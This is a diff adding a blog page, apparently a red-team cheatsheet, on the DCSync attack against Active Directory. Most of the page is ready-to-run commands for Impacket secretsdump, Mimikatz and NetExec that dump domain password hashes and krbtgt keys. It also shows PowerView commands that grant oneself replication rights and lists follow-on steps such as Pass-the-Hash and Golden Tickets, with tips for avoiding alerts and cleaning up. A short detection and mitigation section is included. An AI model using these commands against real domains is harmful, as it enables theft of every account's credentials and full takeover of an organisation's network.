@@ -1,0 +1,422 @@
+<!DOCTYPE HTML>
+<html>
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+    <title>
+      vipa0z</title>
+  <meta name="author" content="vipa0z">
+  
+  <meta name="description" content="Documenting the mechanics of system failure through red team tactics, CTF writeups, malware analysis, and the path into deeper systems hacking.">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="vipa0z"/>
+
+  
+    <meta property="og:image" content="favicon.png"/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="vipa0z" type="application/atom+xml">
+  
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/gitbook.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+  <meta name="title" content="vipa0z">
+  <!-- analytics -->
+  
+
+        <!--  favicon/indexing -->
+        <link rel="icon" type="image/png" href="/favicon.ico/favicon-96x96.png" sizes="96x96" />
+        <link rel="icon" type="image/svg+xml" href="/favicon.ico/favicon.svg" />
+        <link rel="shortcut icon" href="/favicon.ico/favicon.ico" />
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon.ico/apple-touch-icon.png" />
+        <link rel="manifest" href="/favicon.ico/site.webmanifest" />
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+	<div class="container">
+		<button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+			<span class="sr-only">Toggle navigation</span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+			<span class="icon-bar"></span>
+		</button>
+		<a class="navbar-brand" href="/">
+			vipa0z
+		</a>
+		<div class="collapse navbar-collapse nav-menu">
+			<ul class="nav navbar-nav">
+				
+					<li>
+						<a href="/index" title="Home">
+							<i class="fa fa-home"></i>Home
+						</a>
+					</li>
+					
+					<li>
+						<a href="/archives" title="All the articles.">
+							<i class="fa fa-archive"></i>Archives
+						</a>
+					</li>
+					
+					<li>
+						<a href="/tags" title="All the tags.">
+							<i class="fa fa-tags"></i>Tags
+						</a>
+					</li>
+					
+					<li>
+						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
+							<i class="fa fa-book"></i>Docs
+						</a>
+					</li>
+					
+					<li>
+						<a href="/about" title="About me.">
+							<i class="fa fa-user"></i>About Me
+						</a>
+					</li>
+					
+						<!-- Theme Toggle -->
+						<li>
+							<a href="#" class="theme-toggle-btn" aria-label="Toggle theme">
+								<i class="fa fa-moon-o"></i> Theme
+							</a>
+						</li>
+			</ul>
+		</div>
+	</div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+  <div class="container">
+  	<div class="content">
+    	 
+	
+		<div class="page-header">
+			<h1> </h1>
+		</div>
+	
+
+
+
+<div class="row page">
+	<!-- cols -->
+	
+	<div class="col-md-12"> 
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h1 id="DCSync-Attack"><a href="#DCSync-Attack" class="headerlink" title="DCSync Attack"></a>DCSync Attack</h1><p>Abuse Active Directory replication rights to remotely dump password hashes from the domain controller.<br>DCSync simulates a domain controller and requests password data, allowing complete domain compromise without touching the DC’s disk.</p>
+<h2 id="Quick-Reference"><a href="#Quick-Reference" class="headerlink" title="Quick Reference"></a>Quick Reference</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Impacket secretsdump</span></span><br><span class="line">secretsdump.py domain.local/username:password@10.10.10.10 -just-dc</span><br><span class="line"></span><br><span class="line"><span class="comment"># Mimikatz DCSync</span></span><br><span class="line">lsadump::dcsync /domain:domain.local /user:administrator</span><br><span class="line"></span><br><span class="line"><span class="comment"># NetExec with ntdsutil module</span></span><br><span class="line">nxc smb 10.10.10.10 -u username -p password -M ntdsutil</span><br></pre></td></tr></table></figure>
+
+<h2 id="Impacket-Secretsdump"><a href="#Impacket-Secretsdump" class="headerlink" title="Impacket Secretsdump"></a>Impacket Secretsdump</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># DCSync all users</span></span><br><span class="line">secretsdump.py domain.local/username:password@10.10.10.10 -just-dc</span><br><span class="line"></span><br><span class="line"><span class="comment"># DCSync specific user</span></span><br><span class="line">secretsdump.py domain.local/username:password@10.10.10.10 -just-dc-user administrator</span><br><span class="line"></span><br><span class="line"><span class="comment"># DCSync with NTLM hash</span></span><br><span class="line">secretsdump.py domain.local/username@10.10.10.10 -hashes :NTHASH -just-dc</span><br><span class="line"></span><br><span class="line"><span class="comment"># Output to file</span></span><br><span class="line">secretsdump.py domain.local/username:password@10.10.10.10 -just-dc -outputfile domain_hashes</span><br><span class="line"></span><br><span class="line"><span class="comment"># DCSync NTLM hashes only</span></span><br><span class="line">secretsdump.py domain.local/username:password@10.10.10.10 -just-dc-ntlm</span><br><span class="line"></span><br><span class="line"><span class="comment"># Include password history</span></span><br><span class="line">secretsdump.py domain.local/username:password@10.10.10.10 -just-dc -<span class="built_in">history</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Show password last set dates</span></span><br><span class="line">secretsdump.py domain.local/username:password@10.10.10.10 -just-dc -pwd-last-set</span><br><span class="line"></span><br><span class="line"><span class="comment"># Show user status (enabled/disabled)</span></span><br><span class="line">secretsdump.py domain.local/username:password@10.10.10.10 -just-dc -user-status</span><br><span class="line"></span><br><span class="line"><span class="comment"># DCSync krbtgt (for Golden Ticket)</span></span><br><span class="line">secretsdump.py domain.local/username:password@10.10.10.10 -just-dc-user krbtgt</span><br></pre></td></tr></table></figure>
+
+<h2 id="Mimikatz-DCSync"><a href="#Mimikatz-DCSync" class="headerlink" title="Mimikatz DCSync"></a>Mimikatz DCSync</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Start Mimikatz</span></span><br><span class="line">.\mimikatz.exe</span><br><span class="line"></span><br><span class="line"><span class="comment"># Enable debug privilege</span></span><br><span class="line">mimikatz <span class="comment"># privilege::debug</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DCSync specific user</span></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:domain.local /user:administrator</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DCSync krbtgt</span></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:domain.local /user:krbtgt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DCSync all users</span></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:domain.local /all</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># DCSync with CSV output</span></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:domain.local /user:administrator /csv</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Running-as-Different-User-Windows"><a href="#Running-as-Different-User-Windows" class="headerlink" title="Running as Different User (Windows)"></a>Running as Different User (Windows)</h2><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"># Spawn PowerShell as user with DCSync rights</span><br><span class="line">runas /netonly /user:domain\username powershell</span><br><span class="line"></span><br><span class="line"># From new PowerShell, run Mimikatz</span><br><span class="line">.\mimikatz.exe</span><br><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # lsadump::dcsync /domain:domain.local /user:administrator</span><br></pre></td></tr></table></figure>
+
+<h2 id="Check-for-DCSync-Permissions"><a href="#Check-for-DCSync-Permissions" class="headerlink" title="Check for DCSync Permissions"></a>Check for DCSync Permissions</h2><h3 id="PowerView"><a href="#PowerView" class="headerlink" title="PowerView"></a>PowerView</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Get user SID</span></span><br><span class="line"><span class="variable">$sid</span> = (<span class="built_in">Get-DomainUser</span> <span class="literal">-Identity</span> username).objectsid</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check for replication rights</span></span><br><span class="line"><span class="built_in">Get-ObjectAcl</span> <span class="string">&quot;DC=domain,DC=local&quot;</span> <span class="literal">-ResolveGUIDs</span> | ? &#123;(<span class="variable">$_</span>.ObjectAceType <span class="operator">-match</span> <span class="string">&#x27;Replication-Get&#x27;</span>)&#125; | ? &#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-match</span> <span class="variable">$sid</span>&#125; | <span class="built_in">select</span> AceQualifier,ObjectDN,ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | <span class="built_in">fl</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="BloodHound"><a href="#BloodHound" class="headerlink" title="BloodHound"></a>BloodHound</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Query for users with DCSync rights</span><br><span class="line">MATCH p=(u:User)-[:DCSync|AllExtendedRights|GenericAll]-&gt;(d:Domain) RETURN p</span><br><span class="line"></span><br><span class="line"># Query for groups with DCSync rights</span><br><span class="line">MATCH p=(g:Group)-[:DCSync|AllExtendedRights|GenericAll]-&gt;(d:Domain) RETURN p</span><br></pre></td></tr></table></figure>
+
+<h2 id="Required-Permissions"><a href="#Required-Permissions" class="headerlink" title="Required Permissions"></a>Required Permissions</h2><p>DCSync requires these replication rights:</p>
+<ul>
+<li><code>DS-Replication-Get-Changes</code> (GUID: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)</li>
+<li><code>DS-Replication-Get-Changes-All</code> (GUID: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)</li>
+<li><code>DS-Replication-Get-Changes-In-Filtered-Set</code> (GUID: 89e95b76-444d-4c62-991a-0facbeda640c)</li>
+</ul>
+<h2 id="Grant-DCSync-Rights-if-you-have-WriteDACL"><a href="#Grant-DCSync-Rights-if-you-have-WriteDACL" class="headerlink" title="Grant DCSync Rights (if you have WriteDACL)"></a>Grant DCSync Rights (if you have WriteDACL)</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Import PowerView</span></span><br><span class="line"><span class="built_in">Import-Module</span> .\PowerView.ps1</span><br><span class="line"></span><br><span class="line"><span class="comment"># Grant DCSync rights to user</span></span><br><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;DC=domain,DC=local&quot;</span> <span class="literal">-PrincipalIdentity</span> username <span class="literal">-Rights</span> DCSync</span><br><span class="line"></span><br><span class="line"><span class="comment"># Verify rights were added</span></span><br><span class="line"><span class="built_in">Get-ObjectAcl</span> <span class="string">&quot;DC=domain,DC=local&quot;</span> <span class="literal">-ResolveGUIDs</span> | ? &#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-match</span> (<span class="built_in">Get-DomainUser</span> username).objectsid&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Common-Workflow"><a href="#Common-Workflow" class="headerlink" title="Common Workflow"></a>Common Workflow</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Step 1: Identify user with DCSync rights</span></span><br><span class="line"><span class="comment"># Check with PowerView or BloodHound</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Obtain credentials for that user</span></span><br><span class="line"><span class="comment"># Password spray, Kerberoasting, etc.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Perform DCSync</span></span><br><span class="line">secretsdump.py domain.local/username:password@10.10.10.10 -just-dc -outputfile domain_hashes</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: Extract important hashes</span></span><br><span class="line"><span class="comment"># administrator, krbtgt, Domain Admins, etc.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 5: Use hashes for further attacks</span></span><br><span class="line"><span class="comment"># Pass-the-Hash, Golden Ticket, etc.</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Extracting-Specific-Data"><a href="#Extracting-Specific-Data" class="headerlink" title="Extracting Specific Data"></a>Extracting Specific Data</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Get only administrator hash</span></span><br><span class="line">secretsdump.py domain.local/user:pass@10.10.10.10 -just-dc-user administrator</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get all Domain Admin hashes</span></span><br><span class="line"><span class="keyword">for</span> user <span class="keyword">in</span> $(<span class="built_in">cat</span> domain_admins.txt); <span class="keyword">do</span></span><br><span class="line">    secretsdump.py domain.local/user:pass@10.10.10.10 -just-dc-user <span class="variable">$user</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Get krbtgt for Golden Ticket</span></span><br><span class="line">secretsdump.py domain.local/user:pass@10.10.10.10 -just-dc-user krbtgt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Get computer accounts</span></span><br><span class="line">secretsdump.py domain.local/user:pass@10.10.10.10 -just-dc | grep <span class="string">&#x27;\$:&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="Parsing-Output"><a href="#Parsing-Output" class="headerlink" title="Parsing Output"></a>Parsing Output</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Extract NTLM hashes only</span></span><br><span class="line"><span class="built_in">cat</span> domain_hashes.ntds | <span class="built_in">cut</span> -d: -f4 &gt; ntlm_hashes.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Extract usernames and hashes</span></span><br><span class="line"><span class="built_in">cat</span> domain_hashes.ntds | awk -F: <span class="string">&#x27;&#123;print $1&quot;:&quot;$4&#125;&#x27;</span> &gt; user_hash.txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find accounts with same password</span></span><br><span class="line"><span class="built_in">cat</span> domain_hashes.ntds | <span class="built_in">cut</span> -d: -f4 | <span class="built_in">sort</span> | <span class="built_in">uniq</span> -d</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find enabled accounts (requires -user-status flag)</span></span><br><span class="line">grep -v <span class="string">&quot;DISABLED&quot;</span> domain_hashes.ntds</span><br></pre></td></tr></table></figure>
+
+<h2 id="Reversible-Encryption-Passwords"><a href="#Reversible-Encryption-Passwords" class="headerlink" title="Reversible Encryption Passwords"></a>Reversible Encryption Passwords</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># DCSync will decrypt reversible encryption passwords</span></span><br><span class="line">secretsdump.py domain.local/user:pass@10.10.10.10 -just-dc</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check cleartext output file</span></span><br><span class="line"><span class="built_in">cat</span> domain_hashes.ntds.cleartext</span><br><span class="line"></span><br><span class="line"><span class="comment"># Find accounts with reversible encryption</span></span><br><span class="line">Get-ADUser -Filter <span class="string">&#x27;userAccountControl -band 128&#x27;</span> -Properties userAccountControl</span><br></pre></td></tr></table></figure>
+
+<h2 id="Notes"><a href="#Notes" class="headerlink" title="Notes"></a>Notes</h2><p><strong>What is DCSync?</strong></p>
+<p>DCSync abuses the Directory Replication Service (DRS) protocol:</p>
+<ol>
+<li>Attacker authenticates as user with replication rights</li>
+<li>Requests password data via DRS</li>
+<li>DC responds with NTLM hashes and Kerberos keys</li>
+<li>No need to access NTDS.dit file directly</li>
+</ol>
+<p><strong>Why It Works:</strong></p>
+<ul>
+<li>Domain Controllers replicate data between each other</li>
+<li>Replication uses DRS protocol</li>
+<li>Any account with replication rights can request data</li>
+<li>DC doesn’t distinguish between real DC and attacker</li>
+</ul>
+<p><strong>Default Accounts with DCSync Rights:</strong></p>
+<ul>
+<li>Domain Admins</li>
+<li>Enterprise Admins</li>
+<li>Administrators</li>
+<li>Domain Controllers</li>
+<li>Read-Only Domain Controllers (limited)</li>
+</ul>
+<p><strong>Required Permissions:</strong></p>
+<p>Three replication rights needed:</p>
+<ol>
+<li><strong>Replicating Directory Changes</strong>: Basic replication</li>
+<li><strong>Replicating Directory Changes All</strong>: Includes sensitive data</li>
+<li><strong>Replicating Directory Changes In Filtered Set</strong>: For RODC</li>
+</ol>
+<p><strong>Detection:</strong></p>
+<p>Event IDs to monitor:</p>
+<ul>
+<li>4662: Operation performed on object<ul>
+<li>Look for replication GUIDs</li>
+<li>From non-DC computers</li>
+<li>By non-DC accounts</li>
+</ul>
+</li>
+<li>5136: Directory service object modified</li>
+<li>4624: Account logon</li>
+</ul>
+<p>Indicators:</p>
+<ul>
+<li>Replication requests from workstations</li>
+<li>Replication by user accounts (not computer accounts)</li>
+<li>Multiple replication requests in short time</li>
+<li>Replication outside maintenance windows</li>
+</ul>
+<p><strong>Advantages over NTDS.dit Extraction:</strong></p>
+<ul>
+<li>No need for DC access</li>
+<li>No file system interaction</li>
+<li>Works remotely</li>
+<li>Faster than copying NTDS.dit</li>
+<li>Less likely to trigger alerts</li>
+<li>No need to stop services</li>
+</ul>
+<p><strong>Output Files:</strong></p>
+<p>Secretsdump creates multiple files:</p>
+<ul>
+<li><code>.ntds</code>: NTLM hashes and Kerberos keys</li>
+<li><code>.ntds.cleartext</code>: Reversible encryption passwords</li>
+<li><code>.ntds.kerberos</code>: Kerberos keys only</li>
+</ul>
+<p><strong>Hash Format:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">domain\username:RID:LM_HASH:NTLM_HASH:::</span><br></pre></td></tr></table></figure>
+
+<p>Example:</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DOMAIN\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br></pre></td></tr></table></figure>
+
+<p><strong>Kerberos Keys:</strong></p>
+<p>DCSync also extracts Kerberos keys:</p>
+<ul>
+<li>AES256</li>
+<li>AES128</li>
+<li>DES (if enabled)</li>
+<li>RC4 (same as NTLM hash)</li>
+</ul>
+<p><strong>krbtgt Account:</strong></p>
+<p>Special importance:</p>
+<ul>
+<li>Used for Golden Ticket attacks</li>
+<li>Should be changed regularly</li>
+<li>Compromise &#x3D; full domain compromise</li>
+<li>Two krbtgt accounts in domain (current and previous)</li>
+</ul>
+<p><strong>Reversible Encryption:</strong></p>
+<p>Some accounts store passwords with reversible encryption:</p>
+<ul>
+<li>Legacy compatibility feature</li>
+<li>Passwords encrypted with RC4</li>
+<li>Key stored in registry (Syskey)</li>
+<li>DCSync automatically decrypts them</li>
+<li>Check with: <code>userAccountControl -band 128</code></li>
+</ul>
+<p><strong>Post-DCSync Actions:</strong></p>
+<ol>
+<li><strong>Pass-the-Hash</strong>: Use NTLM hashes for lateral movement</li>
+<li><strong>Golden Ticket</strong>: Use krbtgt hash for persistence</li>
+<li><strong>Password Cracking</strong>: Crack hashes offline</li>
+<li><strong>Credential Analysis</strong>: Find password patterns</li>
+<li><strong>Privilege Escalation</strong>: Identify high-value accounts</li>
+</ol>
+<p><strong>Mitigation (for defenders):</strong></p>
+<ul>
+<li>Limit replication rights to DCs only</li>
+<li>Monitor for 4662 events</li>
+<li>Use Protected Users group</li>
+<li>Implement tiered admin model</li>
+<li>Regular krbtgt password rotation</li>
+<li>Enable Advanced Audit Policy</li>
+<li>Use Microsoft ATA&#x2F;Defender for Identity</li>
+</ul>
+<p><strong>Best Practices:</strong></p>
+<ol>
+<li>Always output to file for analysis</li>
+<li>Extract krbtgt immediately</li>
+<li>Document all extracted hashes</li>
+<li>Check for password reuse</li>
+<li>Identify high-value accounts</li>
+<li>Clean up artifacts if possible</li>
+</ol>
+<p><strong>Comparison with Other Techniques:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Technique</th>
+<th>Access Required</th>
+<th>Stealth</th>
+<th>Speed</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>DCSync</td>
+<td>Replication rights</td>
+<td>Medium</td>
+<td>Fast</td>
+</tr>
+<tr>
+<td>NTDS.dit copy</td>
+<td>DC file access</td>
+<td>Low</td>
+<td>Slow</td>
+</tr>
+<tr>
+<td>Volume Shadow Copy</td>
+<td>DC admin</td>
+<td>Low</td>
+<td>Medium</td>
+</tr>
+<tr>
+<td>ntdsutil</td>
+<td>DC admin</td>
+<td>Low</td>
+<td>Medium</td>
+</tr>
+</tbody></table>
+<p><strong>Common Errors:</strong></p>
+<ul>
+<li>“Access Denied”: User lacks replication rights</li>
+<li>“RPC Server unavailable”: Firewall blocking</li>
+<li>“Target not found”: Wrong DC name&#x2F;IP</li>
+<li>“Authentication failed”: Wrong credentials</li>
+</ul>
+<p><strong>Advanced Usage:</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># DCSync through SOCKS proxy</span></span><br><span class="line">proxychains secretsdump.py domain.local/user:pass@10.10.10.10 -just-dc</span><br><span class="line"></span><br><span class="line"><span class="comment"># DCSync with Kerberos ticket</span></span><br><span class="line"><span class="built_in">export</span> KRB5CCNAME=user.ccache</span><br><span class="line">secretsdump.py -k -no-pass domain.local/user@dc01.domain.local -just-dc</span><br><span class="line"></span><br><span class="line"><span class="comment"># DCSync specific OU</span></span><br><span class="line">secretsdump.py domain.local/user:pass@10.10.10.10 -just-dc-user <span class="string">&quot;OU=Admins,DC=domain,DC=local&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Cleanup:</strong></p>
+<p>DCSync leaves minimal artifacts:</p>
+<ul>
+<li>Event logs (if auditing enabled)</li>
+<li>Network traffic (DRS protocol)</li>
+<li>Authentication logs</li>
+<li>No files created on DC</li>
+<li>No services installed</li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2025 vipa0z's Blog
+  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+  <script src="/js/theme-toggle.js"></script>
+</body>
+   </html>
